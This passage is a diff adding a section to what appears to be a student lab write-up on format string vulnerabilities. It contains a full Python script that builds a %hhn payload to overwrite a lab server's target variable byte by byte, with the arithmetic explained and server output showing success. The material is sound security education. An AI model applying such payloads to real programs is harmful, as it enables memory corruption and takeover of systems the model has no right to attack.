@@ -195,3 +195,50 @@ server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
 ```
 
 **Note:** The `[output here]` in the server was replaced in orther to keep it clean. In the original server, as `%n` prints empty spaces, the ouput ocupied a very large amount of empty space in the console.
+
+#### 3.C
+
+To change the value to `0xAABBCCDD`, we needed to use `%hhn` and a different approach to building the script. The following script was used to get the input:
+
+```py
+#!/usr/bin/python3
+import sys
+
+address1 = 0x080e506B
+content = (address1).to_bytes(4,byteorder='little') # content has 4 bytes
+address2 = 0x080e506A
+content += (address2).to_bytes(4,byteorder='little') # content has 8 bytes
+address3 = 0x080e5069
+content += (address3).to_bytes(4,byteorder='little') # content has 12 bytes
+address4 = 0x080e5068
+content += (address4).to_bytes(4,byteorder='little') # content has 16 bytes
+
+content += ("%154x%64$hhn").encode('latin-1') # AA = 170
+content += ("%17x%65$hhn").encode('latin-1') # BB = 187
+content += ("%17x%66$hhn").encode('latin-1') # CC = 204
+content += ("%17x%67$hhn").encode('latin-1') # DD = 221
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+As we were using the `%hhn` format specifier, the address points to a char, which means that the address only points to 1 of the 4 bytes of the `target` variable. In order to change all the bytes, we needed 4 addresses. The base address was `0x080e5068`, so the other 3 were `0x080e5069`, `0x080e506A` and `0x080e506B`. With these addresses, we can successfully point to every byte of the `target` variable.
+
+After that, we need to change their contents. Starting with the most significant byte, the one with address `0x080e506B`, we need to change it to `AA` which is 170 bytes. As we have already written 16 bytes, we only need 154 more. The second byte, `0x080e506A`, needs to be changed to `BB`, which is 187 bytes, in decimal. As we have already written 170 bytes for the previous `AA`, we only need 17 more. The same procedure to the other two bytes and we end up with the input ready to be sent to the server. After sending it, the output of the server is the following:
+
+```
+server-10.9.0.5 | Got a connection from 10.9.0.1
+server-10.9.0.5 | Starting format
+server-10.9.0.5 | The input buffer's address:    0xffffd450
+server-10.9.0.5 | The secret message's address:  0x080b4008
+server-10.9.0.5 | The target variable's address: 0x080e5068
+server-10.9.0.5 | Waiting for user input ......
+server-10.9.0.5 | Received 61 bytes.
+server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd378
+server-10.9.0.5 | The target variable's value (before): 0x11223344
+server-10.9.0.5 | kjih                                                                                                                                                  11223344             1000          8049db5          80e5320The target variable's value (after):  0xaabbccdd
+server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+```
+
+As we can see, the `target` variable was successfully changed to `0xaabbccdd`.
